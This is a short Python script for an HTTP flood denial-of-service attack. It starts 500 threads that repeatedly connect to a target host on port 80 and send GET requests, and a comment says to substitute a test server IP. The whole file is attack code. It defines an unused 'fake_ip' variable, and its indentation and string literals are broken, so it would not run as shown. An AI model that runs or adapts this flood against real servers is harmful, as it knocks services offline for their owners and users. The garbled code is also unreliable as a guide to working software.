import threading
import socket

target = 'example.com'  # replace with test server IP
port = 80
fake_ip = '192.168.1.1'  # fake IP address

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
s.sendto((f"GET / HTTP/1.1\r
"
          f"Host: {target}\r
"
          f"Connection: close\r
").encode(), (target, port))
        s.close()

for i in range(500):  # adjust thread count
    thread = threading.Thread(target=attack)
    thread.start()
  